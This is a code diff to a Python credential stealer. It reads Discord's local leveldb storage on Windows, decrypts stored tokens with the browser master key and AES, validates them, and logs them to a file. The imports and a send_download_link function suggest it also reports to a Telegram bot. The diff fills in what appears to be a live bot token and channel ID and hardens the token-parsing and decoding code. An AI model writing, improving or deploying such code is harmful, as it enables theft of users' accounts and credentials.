@@ -1,4 +1,5 @@
 import base64
+import binascii
 from Crypto.Cipher import AES
 import win32crypt
 import os
@@ -6,8 +7,10 @@ import json
 import requests
 import subprocess
 
-BOT_TOKEN = 'YOUR TELEGRAM BOT TOKEN'
-CHANNEL_ID = 'CHANNEL ID WHERE THE BOT IS LOCATED'
+
+
+BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
+CHANNEL_ID = -1002015035900
 
 
 def send_download_link(download_link):
@@ -77,16 +80,15 @@ class Discord:
         username = get_sys_username()
         path: str = "c:/Users/" + username + "/AppData/Roaming/discord/Local Storage/leveldb/"  # Here is where the tokens are stored.
         mkey = get_masterKey()
+        equals_sign = None
         for file in os.listdir(path):
             if file[-3:] in ['ldb', 'log']:
                 with open(path + file, errors='ignore') as f:
                     data = f.readlines()
-                    encrypted_tokens_list = [x.strip() for x in data if 'dQw4w9WgXcQ:' in x]
-                    for token in encrypted_tokens_list:
-                        for _ in token.split():
-                            if 'dQw4w9WgXcQ:' in _:
-                                enc_token_ = _.split('dQw4w9WgXcQ:')[1][:136]
-                                self.encrypted_tokens.append(enc_token_)
+                    encrypted_tokens_list = [x.strip().split('dQw4w9WgXcQ:')[1] for x in data if 'dQw4w9WgXcQ:' in x]
+                    for enc_token in encrypted_tokens_list:
+                        enc_token = enc_token.split()[0].split('"')[0]
+                        self.encrypted_tokens.append(enc_token)
 
         for enc_token in self.encrypted_tokens:
             decoded_token = base64.b64decode(enc_token)
@@ -97,8 +99,11 @@ class Discord:
             try:
                 self.decrypted_tokens.append(decrypted_token[:-15].decode('utf-8'))
             except UnicodeDecodeError:
-                self.decrypted_tokens.append(decrypted_token[:-16].decode('utf-8'))
-                continue
+                try:
+
+                    self.decrypted_tokens.append(decrypted_token[:-16].decode('utf-8'))
+                except UnicodeDecodeError:
+                    continue
 
         return self.decrypted_tokens
 
@@ -107,7 +112,6 @@ if __name__ == '__main__':
     discord = Discord()
     decrypted_tokens = discord.get_tokens()
     for token in decrypted_tokens:
-
         try:
             token = token.replace('', '')
         except ValueError:
@@ -134,13 +138,28 @@ if __name__ == '__main__':
             token = token.replace('', '')
         except ValueError:
             pass
+        try:
+            token = token.replace("'", "")
+        except ValueError:
+            pass
 
+        try:
+            token = token.replace("%", "")
+        except ValueError:
+            pass
 
         token_resp = token_validator(token)
-        uid = token.split('.')[0]
-        dec_uid = base64.b64decode(uid).decode('utf-8')
+        uid_list = token.split('.')
+        uid = uid_list[0]
+
+        try:
+            dec_uid = base64.b64decode(uid).decode('utf-8')
+        except binascii.Error:
+            uid = ''.join(uid_list)[:29]
+            dec_uid = base64.b64decode(uid)[:-2].decode('utf-8')
+
         os.chdir(str('C:\\Users\\' + get_sys_username()))
-        with open('discordToken.txt', 'a', encoding='utf-8') as f:
+        with open('discordToken.txt', 'a', encoding='utf-8', errors='ignore') as f:
             f.writelines(
                 ['=' * 65, f'\nCode: {token_resp[0]}\nToken: {token}\nDiscord ID: {dec_uid}\nName: {token_resp[1]}\n',
                  '=' * 65 + '\n\n'])
